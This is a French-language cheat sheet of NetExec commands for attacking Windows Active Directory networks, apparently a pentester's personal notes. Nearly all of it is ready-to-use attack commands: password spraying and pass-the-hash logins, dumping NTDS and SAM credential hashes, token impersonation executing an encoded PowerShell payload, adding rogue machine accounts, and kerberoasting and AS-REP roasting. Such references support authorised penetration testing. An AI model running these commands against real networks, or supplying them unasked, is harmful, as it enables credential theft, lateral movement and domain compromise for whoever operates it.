# NetExec

## Généralités

- Penser à rajouter un "-k" quand c'est du Kerberos
- Autres liens utiles : 
	- https://www.netexec.wiki/
	- https://github.com/seriotonctf/cme-nxc-cheat-sheet
	- https://github.com/BlWasp/NetExec-Cheatsheet/blob/master/README.md
	- https://github.com/infosecstreams/cheat.sheets/blob/main/netexec.cheat
	- https://www.asifnawazminhas.com/posts/NXC-Command-Cheatsheet/
## Connexions diverses

	netexec smb <IP> -u users.txt -p passwords.txt --local-auth --continue-on-success
	netexec smb vlans.txt -u "<USER>" -H <XXXXX:YYYYY> 
	netexec smb <IP> -u '<DOMAINE>\<USER>' -p '<PASSWORD>'
	netexec smb vlans.txt -u '<USER>' -p '<PASSWORD>' --shares
	netexec winrm vlans.txt -u "<USER>" -H <XXXX:yyyyy> -d "<DOM>"
	netexec smb 10.10.10.10/24 20.20.20.20/24 --gen-relay-list relays.txt

## Informations diverses

```
netexec smb <IP> -u "<USER>" -p '<PASSWORD>' --sessions 
netexec smb <IP> -u "<USER>" -p '<PASSWORD>' --logged-on  
netexec smb <IP> -u "<USER>" -p '<PASSWORD>' --users  
netexec smb <IP> -u "<USER>" -p '<PASSWORD>' --groups  
netexec smb <IP> -u "<USER>" -p '<PASSWORD>' --local-groups  
  
netexec smb <IP> -u "<USER>" -p '<PASSWORD>' --shares  
netexec smb <IP> -u "<USER>" -p '<PASSWORD>' --disks  
  
netexec ldap <IP> -u "<USER>" -p '<PASSWORD>' --users  
netexec ldap <IP> -u "<USER>" -p '<PASSWORD>' --groups
```

## Dumps

	netexec smb <IP> -u "<USER>" -H "HASHES" -d "<DOMAINE>" -M ntdsutil
	netexec smb <IP> -u "<USER>" -H "HASHES" -d "<DOMAINE>" --ntds
	netexec smb <IP> -u "<USER>" -H "HASHES" -d "<DOMAINE>" --sam
	netexec smb liste_machines_même_mdp.txt -u "Administrateur" -H <XXXXX:YYYYY" --local-auth --sam

## Impersonation

	netexec smb <NOM1> <NOM2> -u '<DOMAINE>\<USER>' -p '<PASSWORD>' --local-auth -M impersonate
	
	netexec smb <NOM> -u "<USER>" -p '<PASSWORD>' --local-auth -M impersonate -o TOKEN=1 EXEC="whoami"

	netexec smb <NOM> -u "<USER>" -p '<PASSWORD>' --local-auth -M impersonate -o TOKEN=1 EXEC=' powershell -e <BASE64>'

## Ajout d'ordinateurs

	netexec smb <IP> -u "<USER>" -p '<PASSWORD>' -M add-computer –-options
	netexec smb <IP> -u "<USER>" -p '<PASSWORD>' -M add-computer -o NAME="ordinateur_tim" PASSWORD="<MDP_COMPLEXE>"
	netexec smb <IP> -u "ordinateur_tim$" -p '<PASSWORD>'

## Vérifier le MachineAccountQuota

	netexec ldap <IP> -u <USER> -p '<PASSWORD>' -M MAQ

## Quelques attaques 

```
netexec ldap target -u username -p password --kerberoasting results.txt
netexec ldap target -u username -p password --asreproast results.txt
```
